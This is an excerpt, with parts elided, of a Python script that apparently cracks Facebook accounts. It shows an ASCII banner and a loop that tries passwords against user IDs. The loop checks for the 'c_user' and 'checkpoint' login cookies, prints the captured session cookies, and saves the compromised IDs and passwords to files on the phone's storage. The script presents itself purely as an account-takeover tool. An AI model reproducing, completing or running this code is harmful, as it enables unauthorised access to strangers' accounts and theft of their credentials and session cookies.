...
logo1 = ("""\033[1;37m
      ...
      _       ______   ______   _____  _____  _____     _____          _       ____  ____  
     / \     |_   _ \ |_   _ `.|_   _||_   _||_   _|   |_   _|        / \     |_   ||   _| 
    / _ \      | |_) |  | | `. \ | |    | |    | |       | |         / _ \      | |__| |   
   / ___ \     |  __'.  | |  | | | '    ' |    | |   _   | |   _    / ___ \     |  __  |   
 _/ /   \ \_  _| |__) |_| |_.' /  \ \__/ /    _| |__/ | _| |__/ | _/ /   \ \_  _| |  | |_  
|____| |____||_______/|______.'    `.__.'    |________||________||____| |____||____||____| 
...
def fuck():
    ...
    print(' [+] OK Ids saved inDUDE/OK.txt')
    print(' [+] CP Ids saved inDUDE/CP.txt')
    print('==================================================')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[DUDE-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/DUDE/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[DUDE-OK] {cid}|{ps}")
                open('/sdcard/DUDE-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
